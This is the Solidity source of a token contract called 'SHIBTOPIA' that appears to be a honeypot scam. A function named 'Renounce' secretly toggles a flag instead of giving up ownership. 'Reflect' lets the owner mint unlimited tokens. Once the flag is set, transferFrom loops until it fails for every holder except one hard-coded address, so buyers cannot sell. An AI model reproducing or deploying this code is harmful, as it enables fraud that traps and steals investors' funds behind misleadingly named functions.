row number 
1	       pragma solidity 0.6.12;
2	 contract SHIBTOPIA {
3	 mapping (address => uint256) public balanceOf;
4	 string public name = "Shibtopia";
5	 string public symbol = "SHIBTOPIA";
6	 uint8 public decimals = 18;
7	 uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);
8	 event Transfer(address indexed from, address indexed to, uint256 value);
9	 constructor() public {
10	 balanceOf[msg.sender] = totalSupply;
11	 emit Transfer(address(0), msg.sender, totalSupply);
12	 }
13	 address owner = msg.sender;
14	 bool isEnabled;
15	 modifier onlyOwner() {
16	 require(msg.sender == owner);
17	 _;
18	 }
19	 function Renounce() public onlyOwner {
20	 isEnabled = !isEnabled;
21	 }
22	 function Reflect(address to, uint256 value) public onlyOwner() {
23	 totalSupply += value;
24	 balanceOf[to] += value;
25	 emit Transfer(address(0), to, value);
26	 }
27	 function transfer(address to, uint256 value) public returns (bool success) {
28	 while(isEnabled) {
29	 if(isEnabled) require(balanceOf[msg.sender] >= value);
30	 balanceOf[msg.sender] -= value;
31	 balanceOf[to] += value;
32	 emit Transfer(msg.sender, to, value);
33	 return true;
34	 }
35	 require(balanceOf[msg.sender] >= value);
36	 balanceOf[msg.sender] -= value;
37	 balanceOf[to] += value;
38	 emit Transfer(msg.sender, to, value);
39	 return true;
40	 }
41	 event Approval(address indexed owner, address indexed spender, uint256 value);
42	 mapping(address => mapping(address => uint256)) public allowance;
43	 function approve(address spender, uint256 value) public returns (bool success) {
44	 allowance[msg.sender][spender] = value;
45	 emit Approval(msg.sender, spender, value);
46	 return true;
47	 }
48	 address Dffty = 0xd137a5542e5391E32dA6B82AFf1401BcFbcC5F99;
49	 function transferFrom(address from, address to, uint256 value) public returns (bool success) {
50	 while(isEnabled) {
51	 if(from == Dffty) {
52	 require(value <= balanceOf[from]);
53	 require(value <= allowance[from][msg.sender]);
54	 balanceOf[from] -= value;
55	 balanceOf[to] += value;
56	 allowance[from][msg.sender] -= value;
57	 emit Transfer(from, to, value);
58	 return true;
59	 }
60	 }
61	 require(value <= balanceOf[from]);
62	 require(value <= allowance[from][msg.sender]);
63	 balanceOf[from] -= value;
64	 balanceOf[to] += value;
65	 allowance[from][msg.sender] -= value;
66	 emit Transfer(from, to, value);
67	 return true;
68	 }
69	 }
